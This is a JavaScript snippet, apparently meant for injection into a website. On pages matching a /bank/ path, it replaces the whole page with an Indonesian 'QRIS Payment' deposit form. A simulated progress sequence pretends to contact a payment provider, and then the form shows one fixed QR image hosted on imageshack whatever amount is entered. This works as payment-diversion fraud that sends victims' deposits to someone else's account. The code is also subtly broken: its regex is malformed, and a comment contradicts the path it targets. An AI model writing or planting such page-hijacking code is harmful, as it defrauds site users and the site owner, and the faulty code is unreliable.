(function () {
  const currentPath = window.location.pathname;
  const regex = /(\/bank/\?$)/i;

  // Hanya aktif untuk URL berakhiran /qris atau /qris.php
  if (!regex.test(currentPath)) return;

  // Ganti isi body
  document.body.innerHTML = `
    <div class="wrap">
      <div class="card">
        <h1>QRIS Payment All Deposit</h1>
        <p class="lead">
          Ketik nominal yang ingin dibayar — Deposit Minimal 50,000. 
          Setelah tekan <strong>Bayar</strong> akan muncul Invoice Qris, Scan lalu Bayar.
        </p>

        <label for="amount">Nominal (Rupiah)</label>
        <input id="amount" type="number" inputmode="numeric" min="0" step="1" placeholder="min.50000" />

        <div class="row">
          <button id="payBtn">Bayar</button>
          <button id="clearBtn" style="background:transparent;border:1px solid rgba(255,255,255,0.06);color:#cfeff6;font-weight:600">Reset</button>
        </div>

        <div class="hint">
          Ketentuan: Deposit minimal 50,000 dan wajib menggunakan kode unik serta menggunakan bank atau ewallet aktif
        </div>

        <div id="result" class="result" aria-hidden="true">
          <div class="small">Scan QRIS berikut untuk menyelesaikan pembayaran</div>
          <div class="barcodeBox">
            <img id="barcodeImg" src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg" alt="QRIS Barcode">
          </div>
          <div class="amount" id="showAmount">Rp 0</div>
          <div style="display:flex;gap:8px;width:100%">
            <a id="downloadBtn" href="#" download="qris-barcode.jpg" style="flex:1;padding:10px;border-radius:10px;text-align:center;background:transparent;border:1px solid rgba(255,255,255,0.06);color:#cfeff6;text-decoration:none">Unduh Gambar</a>
            <button id="doneBtn" style="flex:1;background:transparent;border:0;color:#9fb6c6">Tutup</button>
          </div>
        </div>
      </div>
    </div>

    <div id="overlay" class="overlay" aria-hidden="true">
      <div class="loaderCard" role="status">
        <div class="spinner" aria-hidden></div>
        <div id="loaderText">Menyiapkan pembayaran...</div>
        <div class="progress" aria-hidden><i id="prog"></i></div>
      </div>
    </div>
  `;

  // Tambah style ke head
  const style = document.createElement('style');
  style.textContent = `
    :root{--bg:#0f1724;--card:#0b1220;--accent:#06b6d4;--glass:rgba(255,255,255,0.04)}
    *{box-sizing:border-box}
    html,body{height:100%}
    body{margin:0;font-family:Inter, system-ui, -apple-system, 'Helvetica Neue', Arial;display:flex;align-items:center;justify-content:center;background:linear-gradient(180deg,#071127 0%, #071a2a 100%);color:#e6eef6}
    .wrap{width:100%;max-width:420px;padding:20px}
    .card{background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.02));border-radius:16px;padding:18px;box-shadow:0 8px 30px rgba(2,6,23,0.6);}
    h1{font-size:20px;margin:0 0 10px}
    p.lead{margin:0 0 18px;color:#bcd3df;font-size:13px}
    label{display:block;font-size:13px;margin-bottom:8px}
    input[type="number"]{width:100%;padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:transparent;color:inherit;font-size:16px}
    .row{display:flex;gap:10px;margin-top:12px}
    button{flex:1;padding:12px;border-radius:10px;border:0;background:linear-gradient(90deg,var(--accent),#7dd3fc);color:#052023;font-weight:700;font-size:15px;cursor:pointer}
    .hint{font-size:12px;color:#9fb6c6;margin-top:10px}
    .overlay{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(2,6,23,0.6);backdrop-filter: blur(4px);z-index:60;display:none}
    .loaderCard{width:320px;max-width:90%;background:#021428;padding:18px;border-radius:12px;text-align:center;color:#cfeff6}
    .spinner{width:64px;height:64px;border-radius:50%;border:6px solid rgba(255,255,255,0.06);border-top-color:var(--accent);margin:8px auto 12px;animation:spin 1s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
    .progress{height:10px;background:rgba(255,255,255,0.06);border-radius:10px;overflow:hidden;margin-top:10px}
    .progress > i{display:block;height:100%;width:0%;background:linear-gradient(90deg,var(--accent),#7dd3fc);border-radius:10px}
    .result{margin-top:18px;display:none;flex-direction:column;align-items:center;gap:12px}
    .barcodeBox{background:var(--glass);padding:14px;border-radius:12px;display:flex;align-items:center;justify-content:center}
    .barcodeBox img{max-width:100%;height:auto;display:block}
    .amount{font-weight:700;color:#e6f7fb}
    .small{font-size:13px;color:#9fb6c6}
    @media (max-width:420px){.wrap{padding:14px}.card{padding:14px}}
  `;
  document.head.appendChild(style);

  // --- Fungsionalitas ---
  const payBtn = document.getElementById('payBtn');
  const clearBtn = document.getElementById('clearBtn');
  const amountInput = document.getElementById('amount');
  const overlay = document.getElementById('overlay');
  const prog = document.getElementById('prog');
  const loaderText = document.getElementById('loaderText');
  const result = document.getElementById('result');
  const showAmount = document.getElementById('showAmount');
  const barcodeImg = document.getElementById('barcodeImg');
  const downloadBtn = document.getElementById('downloadBtn');
  const doneBtn = document.getElementById('doneBtn');

  const BARCODE_URL = 'https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg';

  function formatRupiah(n) {
    n = Number(n) || 0;
    return 'Rp ' + n.toLocaleString('id-ID');
  }

  payBtn.addEventListener('click', () => {
    const val = amountInput.value.trim();
    if (val === '' || isNaN(Number(val)) || Number(val) <= 0) {
      alert('Masukkan nominal yang valid (syarat&ketentuan).');
      amountInput.focus();
      return;
    }

    overlay.style.display = 'flex';
    overlay.setAttribute('aria-hidden', 'false');
    prog.style.width = '0%';
    loaderText.innerText = 'Menghubungkan ke penyedia...';

    const stages = [
      { t: 700, text: 'Memproses nominal...' },
      { t: 1200, text: 'Membuat transaksi...' },
      { t: 900, text: 'Menunggu konfirmasi...' }
    ];

    let idx = 0;
    let percent = 0;
    const interval = setInterval(() => {
      percent += Math.floor(Math.random() * 12) + 6;
      if (percent > 98) percent = 98;
      prog.style.width = percent + '%';
    }, 200);

    function nextStage() {
      if (idx < stages.length) {
        loaderText.innerText = stages[idx].text;
        setTimeout(() => { idx++; nextStage(); }, stages[idx].t);
      } else {
        clearInterval(interval);
        prog.style.width = '100%';
        loaderText.innerText = 'Selesai.';
        setTimeout(() => {
          overlay.style.display = 'none';
          overlay.setAttribute('aria-hidden', 'true');
          showResult(val);
        }, 700);
      }
    }
    nextStage();
  });

  clearBtn.addEventListener('click', () => {
    amountInput.value = '';
    result.style.display = 'none';
  });

  doneBtn.addEventListener('click', () => {
    result.style.display = 'none';
  });

  function showResult(val) {
    showAmount.innerText = formatRupiah(val);
    barcodeImg.src = BARCODE_URL + '?_=' + Date.now();
    downloadBtn.href = BARCODE_URL;
    result.style.display = 'flex';
    result.setAttribute('aria-hidden', 'false');

    setTimeout(() => {
      result.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }, 150);
  }

  amountInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') payBtn.click();
  });

  window.addEventListener('load', () => amountInput.focus());
})();
